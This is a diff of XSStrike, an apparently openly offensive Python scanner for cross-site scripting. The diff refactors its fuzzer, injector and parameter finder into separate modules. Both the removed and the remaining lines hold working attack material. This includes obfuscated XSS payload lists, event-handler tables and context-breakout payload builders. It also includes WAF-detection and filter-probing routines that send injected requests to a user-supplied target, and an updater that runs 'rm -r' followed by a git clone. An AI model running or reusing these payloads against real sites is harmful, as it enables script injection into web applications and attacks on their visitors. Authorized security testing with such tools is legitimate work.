@@ -6,15 +6,13 @@ import sys # Standars system library
 import os # Standard module for system related operations
 import webbrowser # To open pages in "real" browers
 import random
-from prettytable import PrettyTable # Module for print table of results
-from fuzzywuzzy import fuzz # Module for fuzzy matching
+from core.injector import inject
+from core.fuzzer import fuzzer
+from core.paramfinder import paramfinder
+from core.make_request import make_request
+from urllib.parse import parse_qs, quote_plus
+from urllib.parse import urlparse as parsy
 from time import sleep # To pause the program for a specific time
-try:
-    from builtins import zip # To iterate over multiple lists simultaneously
-    from urllib.parse import urlparse, parse_qs, quote_plus # For parsing URLs
-except:
-    print ('\033[91m[-]\033[0m XSStrike isn\'t compatible with python3. Run it with python3 i.e. \033[7;92mpython3 xsstrike\033[0m')
-    quit()
 
 #Colors and shit like that
 white = '\033[97m'
@@ -29,11 +27,7 @@ bad = '\033[91m[-]\033[0m'
 good = '\033[32m[+]\033[0m'
 run = '\033[97m[~]\033[0m'
 
-user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'
-'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991']
-
-date = '12-06-2018'
+date = '15-06-2018'
 
 def update():
     print('%s Checking for updates...' % run)
@@ -43,7 +37,7 @@ def update():
         if choice != 'n':
             os.system('cd .. && rm -r XSStrike && git clone https://github.com/UltimateHackers/XSStrike')
 
-xsschecker = 'd3v' # A non malicious string to check for reflections and stuff
+xsschecker = 'v3dm0s' # A non malicious string to check for reflections and stuff
 paranames = [] # list for storing parameter names
 paravalues = [] # list for storing parameter values 
 
@@ -55,31 +49,6 @@ occur_number = []
 occur_location = []
 
 delay = 0
-
-tags = ['sVg', 'iMg', 'bOdY', 'd3v', 'deTails'] # HTML Tags
-
-event_handlers = { # Event handlers and the name of tags which can be used with them
-'oNToggLe': ['deTails'],
-'oNMoUseOver': ['d3v', 'a', 'bOdY'],
-'oNeRror': ['OBjEct', 'iMg', 'viDeo'],
-'oNloAd': ['sVg', 'bOdY'],
-'oNsTart': ['maRQuee'],
-'oNfoCus': ['d3v', 'bOdY'],
-'oNCliCk': ['d3v', 'bOdY']
-}
-
-functions = [ # JavaScript functions to get a popup
-'[8].find(confirm)', 'confirm()',
-'(confirm)()', 'co\u006efir\u006d()',
-'(prompt)``', 'a=prompt,a()']
-
-# "Not so malicious" payloads for fuzzing
-fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confirm()>', '<z oNMousEDown=(((confirm)))()>', '<z oNMousEDown=(prompt)``>', '<EmBed sRc=//14.rs>',
-'<EmBed sRc=\/\\14.rs>', '<z oNMoUseOver=yyy>', '<z oNMoUsedoWn=yyy>', '<z oNfoCus=yyy>', '<z oNsUbmit=yyy>', '<z oNToggLe=yyy>', '<z oNoRieNtATionChaNge=yyy>', '<z OnReaDyStateChange=yyy>',
-'<z oNbEfoReEdiTFoCus=yyy>', '<z oNDATAsEtChangeD=yyy>', '<sVG x=y>', '<bODy x=y>', '<emBed x=y>', '<aUdio x=y>', '<sCript x=y z>', '<iSinDEx x=y>',
-'<deTaiLs x=y>', '<viDeo x=y>', '<MaTh><x:link>', 'x<!--y-->z', '<test>', '<script>String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 41)</script>',
-'">payload<br attr="', '&#x3C;script&#x3E;', '<r sRc=x oNError=r>', '<x OnCliCk=(prompt)()>click',
-'<bGsOund sRc=x>']
 
 payloads = [ # Payloads for blind xss and simple bruteforcing
 '\'"</Script><Html Onmouseover=(confirm)()//'
@@ -103,14 +72,6 @@ payloads = [ # Payloads for blind xss and simple bruteforcing
 '<img src=x onerror=confir\u006d`1`>',
 '<svg/onload=co\u006efir\u006d`1`>']
 
-blind_params = ['redirect','redir','url','link','goto','debug','_debug','test','get','index','src','source','file',
-'frame','config','tst','new','old','var','rurl','return_to','_return','returl','last','text','load','email',
-'mail','user','username','password','pass','passwd','first_name','last_name','back','href','ref','data','input',
-'out','net','host','address','code','auth','userid','auth_token','token','error','keyword','key','q','query','aid',
-'bid','cid','did','eid','fid','gid','hid','iid','jid','kid','lid','mid','nid','oid','pid','qid','rid','sid',
-'tid','uid','vid','wid','xid','yid','zid','cal','country','x','y','topic','title','head','higher','lower','width',
-'height','add','result','log','demo','example','message']
-
 # Banner
 print('''  %s____  ___  _________ _________ __          __ __           
   \   \/  / /   _____//   _____//  |________|__|  | __ ____  
@@ -119,57 +80,18 @@ print('''  %s____  ___  _________ _________ __          __ __
   /___/\  \/_______  /_______  /|__|  |__|  |__|__|_ \\\\___  >
         \_/        \/        \/                     \/    \/ v2%s.%s0%s\n''' % (white,red,white,red,white, end))
 
-update()
-
-###############
-#   Fuzzer
-###############
-
-def fuzzer(url, param_data, GET, POST):
-    result = [] # Result of fuzzing
-    progress = 0 # Variable for recording the progress of fuzzing
-    for i in fuzzes:
-        progress = progress + 1
-        sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec. # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-        sys.stdout.write('\r%s Fuzz Sent: %i/%i' % (run, progress, len(fuzzes)))
-        sys.stdout.flush()
-        fuzzy = quote_plus(i) # URL encoding the payload
-        param_data_injected = param_data.replace(xsschecker, fuzzy) # Replcaing the xsschecker with fuzz
-        if GET: # GET parameter
-            r = requests.get(url + param_data_injected) # makes a request to example.search.php?q=<fuzz>
-        else: # POST parameter
-            r = requests.post(url, data=param_data_injected) # Seperating "param_data_injected" with comma because its POST data
-        response = r.text
-        if i in response: # if fuzz string is reflected in the response / source code
-            result.append({
-            'result' : '%sWorks%s' % (green, end),
-            'fuzz' : i})
-        elif str(r.status_code)[:1] != '2': # if the server returned an error (Maybe WAF blocked it)
-            result.append({
-            'result' : '%sBlocked%s'  % (red, end),
-            'fuzz' : i})
-        else: # if the fuzz string was not reflected in the response completely
-            result.append({
-                'result' : '%sFiltered%s' % (yellow, end),
-                'fuzz' : i})
-
-    table = PrettyTable(['Fuzz', 'Response']) # Creates a table with two columns
-    for value in result:
-        table.add_row([value['fuzz'], value['result']]) # Adds the value of fuzz and result to the columns
-    print('\n', table)
-
 ##################
 #   WAF Detector
 ##################
 
 #Function to detect WAF by analysing HTTP response codes
-def WAF_detector(url, param_data, GET, POST):
+def WAF_detector(url, param_data, method):
     global WAF
     WAF = False
     noise = quote_plus('<script>confirm()</script>') #a payload which is noisy enough to provoke the WAF
     fuzz = param_data.replace(xsschecker, noise) #Replaces xsschecker in param_data with noise
     sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-    if GET:
+    if method == 'GET':
         response = requests.get(url + fuzz) # Opens the noise injected payload
     else:
         response = requests.post(url, data=fuzz) # Opens the noise injected payload
@@ -218,13 +140,13 @@ def WAF_detector(url, param_data, GET, POST):
 #   Filter Checker
 ###################
 
-def filter_checker(url, param_data, GET, POST):
+def filter_checker(url, param_data, method):
     strength = '' # A variable for containing strength of the filter
     # Injecting a malicious payload first by replacing xsschecker with our payload
     try:
         low_string = param_data.replace(xsschecker, quote_plus('<svg/onload=(confirm)()>'))
         sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-        if GET:
+        if method == 'GET':
             low_request = requests.get(url + low_string).text
         else:
             low_request = requests.post(url, data=low_string).text
@@ -236,7 +158,7 @@ def filter_checker(url, param_data, GET, POST):
             if choice == 'y':
                 pass
             else:
-                if GET:
+                if method == 'GET':
                     webbrowser.open(url+param_data.strip(xsschecker)+'<svg/onload=(confirm)()>')
                     quit()
             strength = 'low' # As a malicious payload was not filtered, the filter is weak
@@ -244,7 +166,7 @@ def filter_checker(url, param_data, GET, POST):
             # Now we will use a less malicious payload
             medium_string = param_data.replace(xsschecker, quote_plus('<zz onxx=yy>'))
             sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-            if GET:
+            if method == 'GET':
                 medium_request = requests.get(url + medium_string).text
             else:
                 medium_request = requests.post(url, data=medium_string).text
@@ -285,8 +207,9 @@ def html_parser(response):
         occur_location.append(location)
         occur_number.append(number)
 
-def locater(url, param_data, GET, POST):
-    response = make_request(url, param_data, GET, POST) # Makes request to the target
+def locater(url, param_data, method):
+    sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
+    response = make_request(url, param_data, method) # Makes request to the target
     if(xsschecker in response.lower()): # if the xsschecker is found in the response
         global NUM_REFLECTIONS # The number of reflections of xsschecker in the response
         NUM_REFLECTIONS = response.lower().count(xsschecker.lower()) # Counts number of time d3v got reflected in webpage
@@ -295,308 +218,15 @@ def locater(url, param_data, GET, POST):
     else: #Launched hulk if no reflection is found. Hulk Smash!
         print('%s No reflection found.' % bad)
 
-def test_param_check(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, param_data, GET, POST, action):
-    check_string = 'XSSSTART' + payload_to_check + 'XSSEND' # We are adding XSSSTART and XSSEND to make
-    compare_string = 'XSSSTART' + payload_to_compare + 'XSSEND' # the payload distinguishable in the response
-    param_data_injected = param_data.replace(xsschecker, check_string)
-    try:
-        check_response = make_request(url, param_data_injected, GET, POST)
-    except:
-        check_response = ''
-    success = False
-    occurence_counter = 0 # Variable to keep track of which reflection is going through the loop
-    # Itretating over the reflections
-    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
-        occurence_counter = occurence_counter + 1
-        efficiency = fuzz.partial_ratio(check_response[m.start():m.start()+len(compare_string)].lower(), compare_string.lower())
-        if efficiency == 100:
-            if action == 'do':
-                print('\n%s Payload: %s' % (good, payload_to_compare))
-                print('%s Efficiency: 100%%' % good)
-                choice = input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower()
-                if choice == 'y':
-                    pass
-                else:
-                    if GET:
-                        webbrowser.open(url+param_data.replace(xsschecker, payload_to_compare))
-                        quit()
-            if occurence_counter == OCCURENCE_NUM:
-                success = True
-            break
-        
-        if efficiency > 90:
-            if action == 'do':
-                print('\n%s Payload: %s' % (good, payload_to_compare))
-                print('%s Efficiency: %s' % (good, efficiency))
-                try:
-                    data_type = occur_location[OCCURENCE_NUM - 1]
-                    if data_type == 'comment':
-                        location_readable = 'inside a HTML comment '
-                    elif data_type == 'html':
-                        location_readable = 'as data or plaintext on the page'
-                    elif data_type == 'script':
-                        location_readable = 'as data in javascript'
-                    elif data_type == 'attribute':
-                        location_readable = 'as an attribute in a HTML tag'
-                    print('%s Location: %s' % (good, location_readable))
-                    break
-                except:
-                    continue
-    return success
-
-def make_request(url, param_data, GET, POST): #The main function which actually makes contact with the target
-    headers = {
-    'Host' : urlparse(url).hostname,
-    'User-Agent' : random.choice(user_agents),
-    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'Accept-Language' : 'en-US,en;q=0.5',
-    'Accept-Encoding' : 'deflate',
-    'Connection' : 'close',
-    'DNT' : '1',
-    'Connection' : 'close',
-    'Upgrade-Insecure-Requests' : '1'}
-    sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-    try:
-        if GET:
-            resp = requests.get(url + param_data) #Makes request
-            return resp.text #Reads the output
-        elif POST:
-            resp = requests.post(url, data=param_data) #Makes request
-            return resp.text #Reads the output
-    except:
-        print('\n%s Target isn\'t responding.' % bad)
-        quit()
-
-#################
-#   Which Quote
-#################
-
-def which_quote(OCCURENCE_NUM, url, param_data, GET, POST):
-    check_string = 'XSSSTART' + 'd3v' + 'XSSEND'
-    compare_string = 'XSSSTART' + 'd3v' + 'XSSEND'
-    param_data_injected = param_data.replace(xsschecker, check_string)
-    try:
-        check_response = make_request(url, param_data_injected, GET, POST)
-    except:
-        check_response = ''
-    quote = ''
-    occurence_counter = 0
-    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
-        occurence_counter += 1
-        if occurence_counter == OCCURENCE_NUM and (check_response[(m.start()-1):m.start()] == '\'' or check_response[(m.start()-1):m.start()] == '"'):
-            return check_response[(m.start()-1):m.start()]
-        elif occurence_counter == OCCURENCE_NUM:
-            return quote
-
-################
-#   ParamFinder
-################
-
-def paramfinder(url, GET, POST):
-    response = requests.get(url).text
-    matches = re.findall(r'<input[^<]*name=\'[^<]*\'*>|<input[^<]*name="[^<]*"*>', response)
-    for match in matches:
-        try:
-            found_param = match.encode('utf-8').split('name=')[1].split(' ')[0].replace('\'', '').replace('"', '')
-        except UnicodeDecodeError:
-            continue
-        print('%s Heuristics found a potentially valid parameter: %s%s%s. Priortizing it.' % (good, green, found_param, end))
-        blind_params.insert(0, found_param)
-    progress = 0
-    for param in blind_params:
-        progress = progress + 1
-        sys.stdout.write('\r%s Parameters checked: %i/%i' % (run, progress, len(blind_params)))
-        sys.stdout.flush()
-        if param not in paranames:
-            if GET:
-                response = requests.get(url + '?' + param + '=' + xsschecker).text
-            if POST:
-                response = requests.post(url, data='%s=%s' % (param, xsschecker)).text
-            if '\'%s\'' % xsschecker in response or '"%s"' % xsschecker in response or ' %s ' % xsschecker in response:
-                print('%s Valid parameter found : %s%s%s' % (good, green, param, end))
-                paranames.append(param)
-                paravalues.append('')
-
-################
-#   Injector
-################
-
-def inject(url, param_data, GET, POST):
-    special = ''
-    l_filling = ''
-    e_fillings = ['%0a','%09','%0d','+'] # "Things" to use between event handler and = or between function and =
-    fillings = ['%0c', '%0a','%09','%0d','/+/'] # "Things" to use instead of space
-    
-    for OCCURENCE_NUM, location in zip(occur_number, occur_location):
-        print('\n%s Testing reflection no. %s ' % (run, OCCURENCE_NUM))
-        allowed = []
-        
-        if test_param_check('k"k', 'k"k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
-            print('%s Double Quotes (") are allowed.' % good)
-            double_allowed = True
-            allowed.append('"')
-        elif test_param_check('k"k', 'k&quot;k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
-            print('%s Double Quotes (") are not allowed.' % bad)
-            print('%s HTML Encoding detected i.e " --> &quot;' % bad)
-            HTML_encoding = True
-        else:
-            print('%s Double Quotes (") are not allowed.' % bad)
-            double_allowed = False
-        
-        if test_param_check('k\'k', 'k\'k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
-            print('%s Single Quotes (\') are allowed.' % good)
-            single_allowed = True
-            allowed.append('\'')
-        else:
-            single_allowed = False
-            print('%s Single Quotes (\') are not allowed.' % bad)
-        
-        if test_param_check('<lol>', '<lol>', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
-            print('%s Angular Brackets (<>) are allowed.' % good)
-            angular_allowed = True
-            allowed.extend(('<', '>'))
-        else:
-            angular_allowed = False
-            print('%s Angular Brackets (<>) are not allowed.' % bad)
-        
-        # if test_param_check('k&gt;k', 'k&gt;k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope') or test_param_check('&gt;', '>', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
-        #     entity_allowed = True
-        #     allowed.append('entity')
-        #     print '%s HTML Entities are allowed.' % good
-        # else:
-        #     entity_allowed = False
-        #     print '%s HTML Entities are  not allowed.' % bad
-        
-        if location == 'comment':
-            print('%s Trying to break out of %sHTML Comment%s context.' % (run, green, end))
-            prefix = '-->'
-            suffixes = ['', '<!--']
-            progress = 1
-            for suffix in suffixes:
-                for tag in tags:
-                    for event_handler, compatible in list(event_handlers.items()):
-                        if tag in compatible:
-                            for filling, function, e_filling in zip(fillings, functions, e_fillings):
-                                progress = progress + 1
-                                sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                                sys.stdout.flush()
-                                if event_handler == 'oNeRror':
-                                    payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                else:
-                                    payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-            print('')
-        elif location == 'script':
-            print('%s Trying to break out of %sJavaScript%s context.' % (run, green, end))
-            quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)
-            if quote == None or quote == '':
-                quote = ''
-            prefixes = ['%s-' % quote, '\\%s-' % quote, '\\%s-' % quote]
-            suffixes = ['-%s' % quote, '-\\%s' % quote, '//%s' % quote]
-            progress = 0
-            for prefix, suffix in zip(prefixes, suffixes):
-                for function in functions:
-                    progress = progress + 1
-                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                    sys.stdout.flush()
-                    payload = prefix + function + suffix
-                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-            test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-        
-        elif location == 'html':
-            print('%s Trying to break out of %sPlaintext%s context.' % (run, green, end))
-            progress = 0
-            l_than, g_than = '', ''
-            if angular_allowed:
-                l_than, g_than = '<', '>'
-            # elif entity_allowed:
-            #     l_than, g_than = '&lt;', '&gt;'
-            else:
-                print('%s Angular brackets are being filtered. Unable to generate payloads.' % bad)
-                continue
-            for tag in tags:
-                for event_handler, compatible in list(event_handlers.items()):
-                    if tag in compatible:
-                        for filling, function, e_filling in zip(fillings, functions, e_fillings):
-                            progress = progress + 1
-                            sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                            sys.stdout.flush()
-                            if event_handler == 'oNeRror':
-                                payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, g_than)
-                            elif tag == 'd3v':
-                                payload = '%s%s%s%s%s%s=%s%s%s%sthis' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
-                            else:
-                                payload = '%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
-                            test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-
-        elif location == 'attribute':
-            print('%s Trying to break out of %sAttribute%s context.' % (run, green, end))
-            quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)
-            
-            if quote == '':
-                prefix = '/>'
-                suffixes = ['<"', '<\'', '<br attr\'=', '<br attr="']
-            
-            elif quote in allowed:
-                prefix = '%s>' % quote
-                suffixes = ['<%s' % quote, '<br attr=%s' % quote]
-                progress = 0
-                for e_filling, function in zip(e_fillings, functions):
-                    payload = '%saUTofOCus/oNfoCus%s=%s%s%s' % (quote, e_filling, e_filling, quote, function)
-                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-                    progress = progress + 1
-                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                    sys.stdout.flush()
-                sys.stdout.flush()
-                progress = progress + 1
-                for suffix in suffixes:
-                    for tag in tags:
-                        for event_handler, compatible in list(event_handlers.items()):
-                            if tag in compatible:
-                                for filling, function, e_filling in zip(fillings, functions, e_fillings):
-                                    progress = progress + 1
-                                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                                    sys.stdout.flush()
-                                    if event_handler == 'oNeRror':
-                                        payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                    else:
-                                        payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-                print('')
-            elif quote not in allowed and 'entity' in allowed:
-                prefix = ''
-                # if quote == '\'':
-                #     prefix = ['&apos;', '&apos;']
-                #     suffixes = ['&lt;&apos;', '&lt; attr=&apos;']
-                # elif quote == '"':
-                #     prefix = ['&quot;', '&quot;']
-                #     suffixes = ['&lt;&quot;', '&lt;br attr=&quot;']
-                # for suffix in suffixes:
-                #     progress = 0
-                #     for tag in tags:
-                #         for event_handler, compatible in event_handlers.items():
-                #             if tag in compatible:
-                #                 for filling, function, e_filling in izip(fillings, functions, e_fillings):
-                #                     progress = progress + 1
-                #                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                #                     sys.stdout.flush()
-                #                     if event_handler == 'oNeRror':
-                #                         payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                #                     else:
-                #                         payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                #                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-            else:
-                print('%s Quotes are being filtered, its not possible to break out of the context.' % bad)
-
 ###################
 #   Param Parser
 ###################
 
-def param_parser(target, param_data, GET, POST):
+def param_parser(target, param_data, method):
     global url
-    if POST:
+    if method == 'POST':
         target = target + '?' + param_data
-    parsed_url = urlparse(target)
+    parsed_url = parsy(target)
     url = parsed_url.scheme+'://'+parsed_url.netloc+parsed_url.path
     parameters = parse_qs(parsed_url.query, keep_blank_values=True)
     for para in parameters:
@@ -608,17 +238,16 @@ def param_parser(target, param_data, GET, POST):
 #   Initiator
 ##################
 
-def initiator(url, GET, POST):
+def initiator(url, method):
     choice = input('%s Would you like to look for hidden parameters? [y/N] ' % que)
     if choice == 'y':
-        paramfinder(url, GET, POST)
+        paramfinder(url, method, paranames, paravalues)
     if len(paranames) == 0:
         print('%s No parameters to test.' % bad)
         quit()
     else:
-        if GET:
-            GET, POST = True, False
-            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, GET, POST)
+        if method == 'GET':
+            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method)
             current_param = 0
             for param_name in paranames:
                 print(('%s-%s' % (red, end)) * 50)
@@ -643,10 +272,9 @@ def initiator(url, GET, POST):
                         delay = 6
                     else:
                         delay = 0
-                    fuzzer(url, param_data, GET, POST) #Launches fuzzer aka Ninja
-                    quit()
-                filter_checker(url, param_data, GET, POST) # Launces filter checker
-                locater(url, param_data, GET, POST) # Launcher locater
+                    fuzzer(url, param_data, method, delay) #Launches fuzzer aka Ninja
+                filter_checker(url, param_data, method) # Launces filter checker
+                locater(url, param_data, method) # Launcher locater
                 if len(occur_number) == 0:
                     choice = input('%s Would you like to launch hulk for blind XSS detection? [Y/n] ' % que).lower()
                     if choice != 'n':
@@ -657,14 +285,13 @@ def initiator(url, GET, POST):
                             next = input('%s Press enter to execute next payload ' % que)
                             #resetting payload
                             param_data = param_data.replace(payload, xsschecker)
-                inject(url, param_data, GET, POST) # Launches injector
+                inject(url, param_data, method, occur_number, occur_location) # Launches injector
                 del occur_number[:] # Clears the occur_number list
                 del occur_location[:] # Clears the occur_location list
                 current_param = current_param + 1
 
-        elif POST:
-            GET, POST = False, True
-            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, GET, POST)
+        elif method == 'POST':
+            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method)
             current_param = 0
             for param_name in paranames:
                 print(('%s-%s' % (red, end)) * 50)
@@ -686,10 +313,9 @@ def initiator(url, GET, POST):
                         delay = 6
                     else:
                         delay = 0
-                    fuzzer(url, param_data, GET, POST) # Launches fuzzer aka Ninja
-                    quit()
-                filter_checker(url, param_data, GET, POST) # Launches filter checker
-                locater(url, param_data, GET, POST) # Launches locater
+                    fuzzer(url, param_data, method, delay) # Launches fuzzer aka Ninja
+                filter_checker(url, param_data, method) # Launches filter checker
+                locater(url, param_data, method) # Launches locater
                 if len(occur_number) == 0:
                     choice = input('%s Would you like to generate some payloads for blind XSS? [Y/n] ' % que).lower()
                     if choice == 'n':
@@ -697,11 +323,11 @@ def initiator(url, GET, POST):
                     else:
                         for payload in payloads: # We will print the payloads from the payloads list
                             print('%s  %s' % (info, payload))
-                            inject(url, param_data, GET, POST) # Launches injector
+                            inject(url, param_data, method) # Launches injector
                             del occur_number[:]
                             del occur_location[:]
                             current_param = current_param + 1
-                inject(url, param_data, GET, POST) # Launches injector
+                inject(url, param_data, method, occur_number, occur_location) # Launches injector
                 del occur_number[:] # Clears the occur_number list
                 del occur_location[:] # Clears the occur_location list
                 current_param = current_param + 1
@@ -732,19 +358,19 @@ def main():
             quit()
     
     if '=' in target: # A url with GET request must have a = so...
-        GET, POST = True, False
+        method = 'GET'
         param_data = ''
-        param_parser(target, param_data, GET, POST)
-        initiator(url, GET, POST)
+        param_parser(target, param_data, method)
+        initiator(url, method)
     else:
         choice = input('%s Does it use POST method? [Y/n] ' % que).lower()
         if choice == 'n':
-            GET, POST = True, False
-            initiator(target, GET, POST)
+            method = 'GET'
+            initiator(target, method)
         else:
-            GET, POST = False, True
+            method = 'POST'
             param_data = input('%s Enter POST data: ' % que)
-            param_parser(target, param_data, GET, POST)
-            initiator(url, GET, POST)
+            param_parser(target, param_data, method)
+            initiator(url, method)
 
 main() #This is the true start of the program
